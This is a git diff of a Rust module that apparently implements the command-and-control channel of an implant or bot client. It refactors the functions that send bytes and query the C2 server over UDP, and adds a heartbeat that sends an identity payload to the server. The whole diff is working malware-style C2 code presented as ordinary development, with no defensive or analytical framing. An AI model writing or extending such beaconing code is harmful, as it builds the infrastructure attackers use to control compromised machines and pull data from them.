@@ -2,6 +2,8 @@ use std::time::Duration;
 use thiserror::Error;
 use tokio::{net::UdpSocket, time::timeout};
 
+use crate::identity::Identity;
+
 pub mod payloads;
 mod reach;
 
@@ -26,12 +28,12 @@ pub fn init() -> C2Com {
 }
 
 impl C2Com {
-    pub async fn send_bytes(&mut self, data: Vec<u8>) -> Result<(), C2ComError> {
+    pub async fn send_bytes(&mut self, data: &[u8]) -> Result<(), C2ComError> {
         setup_communications(self).await?;
 
         if let Some(sock) = &self.udp_sock {
             println!("c2>> sending bytes via udp socket.");
-            timeout(Duration::from_secs(10), sock.send(&data))
+            timeout(Duration::from_secs(10), sock.send(data))
                 .await
                 .map_err(|_| {
                     C2ComError::Timeout("Timed out sending payload to c2 via udp.".into())
@@ -41,7 +43,7 @@ impl C2Com {
         Ok(())
     }
 
-    pub async fn ask(&mut self, payload: Vec<u8>) -> Result<Option<Vec<u8>>, C2ComError> {
+    pub async fn ask(&mut self, payload: &[u8]) -> Result<Option<Vec<u8>>, C2ComError> {
         self.send_bytes(payload).await?;
 
         if let Some(sock) = &self.udp_sock {
@@ -59,6 +61,21 @@ impl C2Com {
 
         println!("c2-- no ask-response via udp socket.");
         Ok(None)
+    }
+
+    pub async fn heartbeat(&mut self, identity: &Identity) {
+        match payloads::heartbeat(identity) {
+            Ok(payload) => {
+                if let Err(err) = self.send_bytes(&payload).await {
+                    eprintln!("c2!! heartbeat failed. {err}");
+                }
+
+                println!("c2ii sent heartbeat.");
+            }
+            Err(err) => {
+                eprintln!("heartbeat payload failed. {err}");
+            }
+        }
     }
 }
 
